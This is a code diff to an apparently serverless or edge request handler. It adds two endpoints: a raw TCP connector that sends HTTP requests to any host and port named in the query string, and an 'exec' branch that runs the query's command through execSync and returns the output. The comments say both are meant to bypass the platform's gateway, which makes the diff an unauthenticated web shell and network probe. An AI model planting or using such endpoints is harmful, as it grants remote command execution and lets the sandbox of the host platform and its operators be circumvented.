@@ -96,6 +96,49 @@ export default async function onRequest(context) {
     }
   }
 
+
+  // ---- 原始 TCP 拨测（绕过 fetch 层的 EO 网关劫持）----
+  if (cmd === 'tcp') {
+    const target = url.searchParams.get('to') || '';
+    const m = target.match(/^([a-z0-9.\-]+):(\d+)(\/.*)?$/i);
+    if (!m) return new Response(JSON.stringify({ err: 'to=host:port[/path][&host=vhost]' }), { status: 400 });
+    const hostHdr = url.searchParams.get('host') || m[1];
+    try {
+      const net = await import('net');
+      const raw = await new Promise((resolve, reject) => {
+        const sock = net.connect({ host: m[1], port: parseInt(m[2]), timeout: 5000 });
+        let buf = '';
+        sock.on('connect', () => {
+          sock.write(`GET ${m[3] || '/'} HTTP/1.1\r\nHost: ${hostHdr}\r\nUser-Agent: probe/1.0\r\nConnection: close\r\n\r\n`);
+        });
+        sock.on('data', d => { buf += d.toString(); if (buf.length > 6000) sock.destroy(); });
+        sock.on('end', () => resolve(buf));
+        sock.on('close', () => resolve(buf));
+        sock.on('timeout', () => { sock.destroy(); resolve(buf || '[timeout, no data]'); });
+        sock.on('error', e => reject(e));
+      });
+      return new Response(JSON.stringify({ target, hostHeader: hostHdr, raw: raw.slice(0, 5000) }, null, 1),
+        { headers: { 'Content-Type': 'application/json; charset=utf-8' } });
+    } catch (e) {
+      return new Response(JSON.stringify({ target, err: String(e && e.message || e) }, null, 1),
+        { headers: { 'Content-Type': 'application/json; charset=utf-8' } });
+    }
+  }
+
+  // ---- 任意命令执行（系统 curl 不受 fetch 补丁影响）----
+  if (cmd === 'exec') {
+    const c = String(url.searchParams.get('cmd') || 'id');
+    try {
+      const cp = await import('child_process');
+      const r = cp.execSync(c, { timeout: 15000, maxBuffer: 2 * 1024 * 1024 }).toString();
+      return new Response(JSON.stringify({ cmd: c, out: r.slice(0, 20000) }, null, 1),
+        { headers: { 'Content-Type': 'application/json; charset=utf-8' } });
+    } catch (e) {
+      return new Response(JSON.stringify({ cmd: c, err: String(e && e.message || e), out: String(e && e.stdout || '').slice(0, 5000) }, null, 1),
+        { headers: { 'Content-Type': 'application/json; charset=utf-8' } });
+    }
+  }
+
   // ---- 基础报告（同 v1，精简）----
   const report = { t: new Date().toISOString(), boot: BOOT, route: url.pathname };
   report.process = trySync(() => ({
